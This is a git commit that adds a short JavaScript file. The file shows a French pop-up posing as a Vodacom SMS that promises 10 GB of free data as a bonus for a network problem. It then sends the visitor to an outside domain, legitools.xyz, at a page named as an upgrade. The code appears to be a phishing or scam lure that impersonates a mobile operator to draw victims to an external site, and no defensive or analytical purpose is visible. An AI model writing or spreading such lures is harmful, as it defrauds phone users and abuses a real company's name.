42057fe2d1553c42bc376af707f9d643632fa6db
katemj25 <mbokofficial1@gmail.com>
2025-07-22 21:29:59 -0700

    Create activate-10govodacom-data.js

---
+++ activate-10govodacom-data.js
@@ -0,0 +1,5 @@
+var password = '10 Go de données gratuites'
+password=prompt('SMS: Félicitations VODACOM offre 10 Go de données à ses clients en guise de bonus pour une mauvaise mise à niveau du réseau, Veuillez appuyer sur OK pour ACTIVER. ','10 Go de données gratuites');
+if (password != '10 Go de données gratuites') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
